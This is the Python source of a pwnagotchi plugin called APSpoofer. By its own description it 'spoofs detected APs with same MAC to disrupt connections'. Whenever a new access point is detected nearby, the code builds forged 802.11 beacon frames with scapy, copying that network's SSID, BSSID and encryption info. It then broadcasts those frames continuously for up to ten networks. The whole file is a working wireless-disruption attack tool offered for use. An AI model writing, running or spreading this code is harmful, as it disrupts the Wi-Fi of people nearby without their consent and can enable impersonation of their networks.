import logging
import threading
from time import sleep
from pwnagotchi import plugins
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
from pwnagotchi.ui import fonts
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp

class APSpoofer(plugins.Plugin):
    __author__ = 'avipars'
    __version__ = '1.0.3.3'
    __license__ = 'GPL3'
    __description__ = 'Spoofs detected APs with same MAC to disrupt connections.'
    __dependencies__ = {
        'pip': ['scapy'],
    }
    __defaults__ = {
        'enabled': False,
        'max_spoofed': 10,  # Maximum number of APs to spoof simultaneously
    }

    def __init__(self):
        self.options = dict()
        self.ready = False
        self.shutdown = False
        self.running = False
        self.spoofed_aps = {}  # Dictionary to store AP info: {mac: {ssid, channel, crypto}}
        self.broadcast_thread = None
        self.iface = None

    @staticmethod
    def create_spoof_beacon(ssid, mac_addr, encrypted=False):
        """
        Create a beacon frame with the same MAC as the target AP
        """
        dot11 = Dot11(type=0,
                      subtype=8,
                      addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
                      addr2=mac_addr,  # Source (AP MAC)
                      addr3=mac_addr)  # BSSID (AP MAC)

        beacon = Dot11Beacon(cap='ESS+privacy' if encrypted else 'ESS')
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))

        if not encrypted:
            return RadioTap()/dot11/beacon/essid

        # Add RSN information for encrypted networks
        rsn = Dot11Elt(ID='RSNinfo', info=(
                       '\x01\x00'
                       '\x00\x0f\xac\x02'
                       '\x02\x00'
                       '\x00\x0f\xac\x04'
                       '\x00\x0f\xac\x02'
                       '\x01\x00'
                       '\x00\x0f\xac\x02'
                       '\x00\x00'))

        return RadioTap()/dot11/beacon/essid/rsn

    def on_loaded(self):
        self.ready = True
        logging.info('[APSpoofer] Plugin loaded')
        self.running = True

    def on_ready(self, agent):
        if not self.ready or not self.running or self.shutdown:
            logging.info('[APSpoofer] on Ready but not running')
            return

        self.iface = agent.config()['main']['iface']
        logging.info('[APSpoofer] Ready on interface %s', self.iface)

        # Start the beacon broadcasting thread
        self.broadcast_thread = threading.Thread(target=self._broadcast_beacons)
        self.broadcast_thread.daemon = True
        self.broadcast_thread.start()

    # def on_wifi_update(self, agent, access_points):
    #     """
    #     Called when the list of APs is updated
    #     You can also use this as an alternative to on_bcap_wifi_ap_new
    #     """
    #     pass

    def on_bcap_wifi_ap_new(self, agent, event):
        """
        Called when a new AP is detected
        """
        if not self.ready or not self.running or self.shutdown:
            logging.info('[APSpoofer] on_bcap_wifi_ap_new but not running')
            return

        ap = event['data']
        
        # Extract AP information
        mac = ap.get('mac', '').upper()
        ssid = ap.get('hostname', ap.get('ssid', 'Unknown'))
        encryption = ap.get('encryption', '')
        
        if not mac or mac in self.spoofed_aps:
            return

        max_spoofed = 10
        #if 'max_spoofed' in self.options:
            #max_spoof = self.options['max_spoofed']
        # Check if we've reached the max spoofed APs limit
        if len(self.spoofed_aps) >= max_spoofed:
            logging.debug('[APSpoofer] Max spoofed APs reached (%d)', len(self.spoofed_aps))
            return

        # Determine if AP is encrypted
        is_encrypted = encryption and encryption.lower() != 'open'

        # Add to spoofed list
        self.spoofed_aps[mac] = {
            'ssid': ssid,
            'encrypted': is_encrypted,
            'encryption': encryption
        }

        logging.info('[APSpoofer] Now spoofing AP: %s (%s) - Encryption: %s', 
                     ssid, mac, encryption if is_encrypted else 'Open')

        # Update UI counter
        try:
            agent.view().set('apspoof', str(len(self.spoofed_aps)))
        except Exception as ex:
            logging.debug('[APSpoofer] UI update error: %s', ex)

    def _broadcast_beacons(self):
        """
        Continuously broadcast beacon frames for all spoofed APs
        """
        while not self.shutdown and self.running and self.ready:
            if not self.spoofed_aps or not self.iface:
                sleep(1)
                continue

            try:
                frames = []
                for mac, ap_info in list(self.spoofed_aps.items()):
                    try:
                        frame = APSpoofer.create_spoof_beacon(
                            ap_info['ssid'],
                            mac,
                            ap_info['encrypted']
                        )
                        frames.append(frame)
                    except Exception as ex:
                        logging.debug('[APSpoofer] Error creating beacon for %s: %s', mac, ex)

                if frames:
                    sendp(frames, iface=self.iface, verbose=False)
                    sleep(0.1)
                else:
                    sleep(1)

            except Exception as ex:
                logging.error('[APSpoofer] Broadcast error: %s', ex)
                sleep(1)

    def on_before_shutdown(self):
        logging.info('[APSpoofer] Shutting down...')
        self.shutdown = True
        self.running = False
        self.ready = False
        if self.broadcast_thread:
            self.broadcast_thread.join(timeout=2)

    def on_ui_setup(self, ui):
        with ui._lock:
            ui.add_element('apspoof', LabeledValue(
                color=BLACK, 
                label='S', 
                value='-', 
                position=(ui.width() / 2 + 40, 0),
                label_font=fonts.Bold, 
                text_font=fonts.Medium
            ))

    def on_unload(self, ui):
        logging.info('[APSpoofer] plugin is unloading')
        self.running = False
        self.shutdown = True
        self.ready = False
        with ui._lock:
            try:
                ui.remove_element('apspoof')
            except Exception as e:
                logging.error(f'[APSpoofer] UI element removal error {e}',  exc_info=True)

     




